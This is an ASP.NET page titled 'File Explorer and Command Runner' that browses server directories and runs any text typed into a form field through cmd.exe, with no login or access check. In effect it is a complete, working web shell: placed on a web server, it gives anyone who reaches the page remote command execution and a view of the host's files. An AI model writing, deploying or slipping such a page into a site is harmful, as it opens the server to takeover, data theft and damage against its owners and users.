<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>

<!DOCTYPE html>
<html>
<head>
    <title>File Explorer and Command Runner</title>
    <style>
        body { font-family: Arial, sans-serif; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
        .form-group { margin-bottom: 15px; }
        .form-control { width: 100%; padding: 5px; }
        .btn { padding: 5px 10px; background-color: #4CAF50; color: white; border: none; cursor: pointer; }
        .btn:hover { background-color: #45a049; }
        pre { white-space: pre-wrap; word-wrap: break-word; }
    </style>
</head>
<body>
    <div class="container">
        <h1>File Explorer and Command Runner</h1>

        <form runat="server">
            <div class="form-group">
                <asp:TextBox ID="PathTextBox" runat="server" CssClass="form-control" />
            </div>
            <div class="form-group">
                <asp:Button ID="ListButton" runat="server" Text="List Files" OnClick="ListButton_Click" CssClass="btn" />
            </div>
            <div class="form-group">
                <asp:TextBox ID="CommandTextBox" runat="server" CssClass="form-control" />
            </div>
            <div class="form-group">
                <asp:Button ID="RunButton" runat="server" Text="Run Command" OnClick="RunButton_Click" CssClass="btn" />
            </div>
        </form>

        <asp:Literal ID="OutputLiteral" runat="server" />
    </div>

    <script runat="server">
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                PathTextBox.Text = Server.MapPath(".");
            }
        }

        protected void ListButton_Click(object sender, EventArgs e)
        {
            string path = PathTextBox.Text;
            if (Directory.Exists(path))
            {
                string[] directories = Directory.GetDirectories(path);
                string[] files = Directory.GetFiles(path);

                System.Text.StringBuilder sb = new System.Text.StringBuilder();
                sb.Append("<h2>Directory Listing for: " + Server.HtmlEncode(path) + "</h2>");
                sb.Append("<table>");
                sb.Append("<tr><th>Name</th><th>Type</th><th>Size</th><th>Last Modified</th></tr>");

                foreach (string dir in directories)
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(dir);
                    sb.Append("<tr>");
                    sb.Append("<td>" + Server.HtmlEncode(dirInfo.Name) + "</td>");
                    sb.Append("<td>Directory</td>");
                    sb.Append("<td>-</td>");
                    sb.Append("<td>" + dirInfo.LastWriteTime + "</td>");
                    sb.Append("</tr>");
                }

                foreach (string file in files)
                {
                    FileInfo fileInfo = new FileInfo(file);
                    sb.Append("<tr>");
                    sb.Append("<td>" + Server.HtmlEncode(fileInfo.Name) + "</td>");
                    sb.Append("<td>File</td>");
                    sb.Append("<td>" + fileInfo.Length + " bytes</td>");
                    sb.Append("<td>" + fileInfo.LastWriteTime + "</td>");
                    sb.Append("</tr>");
                }

                sb.Append("</table>");
                OutputLiteral.Text = sb.ToString();
            }
            else
            {
                OutputLiteral.Text = "<p>Invalid directory path.</p>";
            }
        }

        protected void RunButton_Click(object sender, EventArgs e)
        {
            string command = CommandTextBox.Text;
            if (!string.IsNullOrEmpty(command))
            {
                try
                {
                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c " + command;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();

                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();

                    OutputLiteral.Text = "<h2>Command Output:</h2><pre>" + Server.HtmlEncode(output) + "</pre>";
                }
                catch (Exception ex)
                {
                    OutputLiteral.Text = "<p>Error executing command: " + Server.HtmlEncode(ex.Message) + "</p>";
                }
            }
            else
            {
                OutputLiteral.Text = "<p>Please enter a command.</p>";
            }
        }
    </script>
</body>
</html>
